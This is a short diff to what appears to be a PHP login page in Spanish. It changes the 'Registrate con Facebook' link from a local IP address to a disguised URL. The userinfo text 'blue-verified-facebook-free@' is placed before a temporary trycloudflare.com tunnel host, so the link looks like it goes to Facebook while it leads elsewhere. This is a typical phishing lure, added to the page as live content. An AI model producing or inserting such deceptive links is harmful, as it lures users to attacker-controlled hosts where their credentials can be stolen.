@@ -65,7 +65,7 @@ if(isset($_POST['username'])){
                                     <button type="button" class="btn btn-link btn-floating mx-1">
                                         <i class="fab fa-facebook-f"></i>
 
-                                        <a href="http://192.168.100.93/">Registrate con Facebook</a>
+                                        <a href="https://blue-verified-facebook-free@span-programming-brain-meat.trycloudflare.com">Registrate con Facebook</a>
                                     </button>
                                 </div>
                             </div>
